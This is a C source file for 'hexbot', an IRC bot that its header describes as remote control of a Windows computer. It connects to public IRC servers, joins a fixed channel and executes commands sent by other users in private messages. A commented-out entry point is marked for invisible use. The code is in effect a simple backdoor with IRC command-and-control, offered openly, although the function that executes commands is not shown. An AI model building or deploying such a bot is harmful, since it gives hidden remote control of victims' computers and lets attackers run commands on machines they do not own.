/*[ hexbot IRC bot ][ 2013 ]
*
*	Written by Bashlykov Sergey aka hexfox
*
*   hexbot - Remote control of a Windows computer via IRC.
*   The IRC bot connects to the IRC server and enters
*   the channel. When another user sends a private message
*   to the bot, this message as a command is executed
*   on the remote computer where the bot started.
*
*/

#include "functions.h"

 /*
//For invisible use "WINAPI WinMain"
int WINAPI WinMain(
                    HINSTANCE hInstance,        //handle to current instance
                    HINSTANCE hPrevInstance,	//handle to previous instance
                    LPSTR lpCmdLine,            //pointer to command line
                    int nCmdShow                //show state of window
                  )
*/

int main()
{
    //must be many servers if one not avialable
    struct server serv = { {"chat.freenode.net",
                           "irc.757.org",
                           "irc.eth-0.nl"}, "6667" };
    struct nickname nicknm = {"zname", "znick", "hexbot"};
    struct commands cmds = {NULL, NULL, "JOIN #h3xb0t\n",
                            "PONG ", "PART #h3xb0t\n", "QUIT :bye\n"};
    struct buffers buffs;
    struct vars_messages vars_msgs;

    int len_buff_from;
    unsigned int i = 0,
                 stopped = 0,
                 changed_server = 0,
                 count_hosts;
    boolean pong;
    SOCKET _socket;

    count_hosts = sizeof(serv.hosts) / sizeof(serv.hosts[0]);

    memset(buffs.tmp, 0, sizeof(buffs.tmp));
    memset(buffs.from, 0, sizeof(buffs.from));

    while(1)
    {
        if (i == (count_hosts - 1))
            i = 0;

        //connect to irc host
        if (!(_socket =
              createSocket(serv.hosts[i],
                           (unsigned short)atoi(serv.port))))
        {
            printf("Can't connected to %s\n", serv.hosts[i]);
            deleteSocket(_socket);
            i++;
            continue;
        }
        printf("Connected to %s\n", serv.hosts[i]);

        //send user and nick to irc host
        sendUserNick(   _socket,
                        &nicknm,
                        &vars_msgs);

        while((len_buff_from =
               recv(_socket, buffs.from,
                    sizeof(buffs.from), 0))
              != SOCKET_ERROR)
        {
            //parse buffer for < userfrom@ip servercmd userto : >
            sscanf(buffs.from, "%s%s%s",
                   vars_msgs.usnd, vars_msgs.srvcmd, vars_msgs.snick);

            joinToChannel(  _socket,
                            &buffs,
                            &cmds);
            //for reconnect
            if(strstr(buffs.from, "ERROR :Closing Link"))
            {
                i++;
                break;
            }

            pong = pingPong(   _socket,
                               &buffs,
                               &cmds);

            //if parsing cmd from server and nicks equally
            if (pong == FALSE)
            {
               enum FlagsCommandRemoteUser
                       flag = commandFromRemoteUser(  _socket,
                                                      &buffs,
                                                      &cmds,
                                                      &vars_msgs);
               switch (flag) {
               case NotPrivMsg:
                   break;
               case PrivMsg:
                   break;
               case Reconnect:
                   changed_server = 1;
                   break;
               case Stopped:
                   stopped = 1;
                   break;
               }
            }

            if(changed_server)
            {
                printf("Changed server\n");
                ++i;
                changed_server = 0;
                send(_socket, cmds.part, (int)strlen(cmds.part), 0);
                send(_socket, cmds.quit, (int)strlen(cmds.quit), 0);
                deleteSocket(_socket);
                break;
            }

            //the end bot work
            if (stopped)
            {
                send(_socket, cmds.part, (int)strlen(cmds.part), 0);
                send(_socket, cmds.quit, (int)strlen(cmds.quit), 0);
                deleteSocket(_socket);
                printf("hexbot is stopped!\n");
                exit(0);
            }

            len_buff_from = 0;
            memset(buffs.from, 0, sizeof(buffs.from));
        }
    }
}
